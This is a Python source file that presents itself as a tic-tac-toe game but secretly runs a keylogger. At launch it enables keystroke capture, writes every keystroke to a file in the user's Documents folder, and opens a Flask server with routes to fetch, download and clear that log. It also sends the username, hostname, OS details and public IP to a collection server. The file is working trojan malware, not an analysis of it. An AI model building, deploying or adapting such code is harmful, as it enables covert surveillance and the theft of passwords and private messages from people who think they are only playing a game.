import os
import threading
import time
import socket
import platform
import getpass
import json
import requests
from datetime import datetime
from flask import Flask, request, send_file
from pynput import keyboard
import psutil
import tkinter as tk
from tkinter import messagebox

# === Tic Tac Toe Game ===
class TicTacToe:
    def __init__(self, root):
        self.root = root
        self.root.title("Tic Tac Toe")
        self.current_player = "X"
        self.board = [None] * 9
        self.buttons = []
        self.create_board()

    def create_board(self):
        for i in range(9):
            btn = tk.Button(self.root, text="", font=('Arial', 32), width=5, height=2,
                            command=lambda i=i: self.on_click(i))
            btn.grid(row=i // 3, column=i % 3)
            self.buttons.append(btn)

    def on_click(self, idx):
        if self.board[idx] is None:
            self.board[idx] = self.current_player
            self.buttons[idx].config(text=self.current_player)
            if self.check_winner():
                messagebox.showinfo("Game Over", f"Player {self.current_player} wins!")
                self.reset_board()
            elif None not in self.board:
                messagebox.showinfo("Game Over", "It's a tie!")
                self.reset_board()
            else:
                self.current_player = "O" if self.current_player == "X" else "X"

    def check_winner(self):
        wins = [
            [0, 1, 2], [3, 4, 5], [6, 7, 8],
            [0, 3, 6], [1, 4, 7], [2, 5, 8],
            [0, 4, 8], [2, 4, 6]
        ]
        for line in wins:
            a, b, c = line
            if self.board[a] == self.board[b] == self.board[c] == self.current_player:
                return True
        return False

    def reset_board(self):
        self.board = [None] * 9
        for btn in self.buttons:
            btn.config(text="")
        self.current_player = "X"

# === Setup Log File ===
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
os.makedirs(documents_path, exist_ok=True)
people_file_path = os.path.join(documents_path, "people_data2.txt")

# === Runtime State ===
capture_enabled = False
log_buffer = ""
lock = threading.Lock()
pressed_keys = set()
last_sent_position = 0


# === Flask App ===
app = Flask(__name__)

@app.route('/start', methods=['POST'])
def start_capture():
    global capture_enabled
    capture_enabled = True
    return "Capture started", 200

@app.route('/stop', methods=['POST'])
def stop_capture():
    global capture_enabled
    capture_enabled = False
    return "Capture stopped", 200

@app.route('/getpeople', methods=['GET'])
def get_people():
    global last_sent_position
    try:
        with lock:
            with open(people_file_path, "r", encoding="utf-8") as f:
                content = f.read()

        if last_sent_position > len(content):
            last_sent_position = 0  # Reset if file was cleared

        new_data = content[last_sent_position:]
        last_sent_position = len(content)

        if not new_data.strip():
            return "", 200

        timestamp = f"\n[TIMESTAMP] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        return timestamp + new_data, 200

    except Exception as e:
        return f"Error reading log: {e}", 500


@app.route('/download', methods=['GET'])
def download_log():
    try:
        return send_file(people_file_path, as_attachment=True)
    except Exception as e:
        return f"Error downloading file: {e}", 500

@app.route('/clear', methods=['POST'])
def clear_log():
    try:
        with lock:
            open(people_file_path, "w", encoding="utf-8").close()
        return "Log cleared", 200
    except Exception as e:
        return f"Error clearing log: {e}", 500

# === Keylogging Logic ===
def write_data(data):
    with lock:
        with open(people_file_path, "a", encoding="utf-8") as f:
            f.write(data)

def on_key_press(key):
    global log_buffer, pressed_keys
    if not capture_enabled:
        return

    try:
        key_str = key.char
        log_buffer += key_str
        write_data(key_str)
    except AttributeError:
        if key == keyboard.Key.backspace:
            log_buffer = log_buffer[:-1]
            with lock:
                with open(people_file_path, "r+", encoding="utf-8") as f:
                    content = f.read()[:-1]
                    f.seek(0)
                    f.write(content)
                    f.truncate()
        else:
            if key in pressed_keys:
                return
            pressed_keys.add(key)

            key_map = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl: "[CTRL]",
                keyboard.Key.alt: "[ALT]",
                keyboard.Key.cmd: "[CMD]",
                keyboard.Key.caps_lock: "[CAPS LOCK]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.esc: "[ESC]"
            }
            key_str = key_map.get(key, f"[{key.name.upper()}]")
            log_buffer += key_str
            write_data(key_str)

def on_key_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

# === System Info Sender ===
def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "N/A"

def collect_info():
    return {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": os.cpu_count(),
        "ram_gb": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip_address": get_ip()
    }

def send_info(server_url):
    data = collect_info()
    try:
        r = requests.post(f"{server_url}/userinfo", json=data, timeout=5)
        if r.status_code == 200:
            print("[✓] Info sent successfully")
        else:
            print(f"[!] Server responded with status {r.status_code}")
    except Exception as e:
        print(f"[!] Failed to send info: {e}")

# === Threaded Starters ===
def run_game():
    root = tk.Tk()
    game = TicTacToe(root)
    root.mainloop()

def run_flask():
    app.run(port=5000, debug=False)

def run_keylogger():
    listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    listener.start()
    return listener


# === Main ===
if __name__ == '__main__':
    SERVER_URL = "http://127.0.0.1:7000"
    print(f"[INFO] Agent running. Logging to: {people_file_path}")
    send_info(SERVER_URL)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    capture_enabled = True
    keylogger_listener = run_keylogger()

    game_thread = threading.Thread(target=run_game)
    game_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] CTRL+C detected. Stopping...")
        keylogger_listener.stop()
        keylogger_listener.join()
        print("[INFO] Agent stopped.")
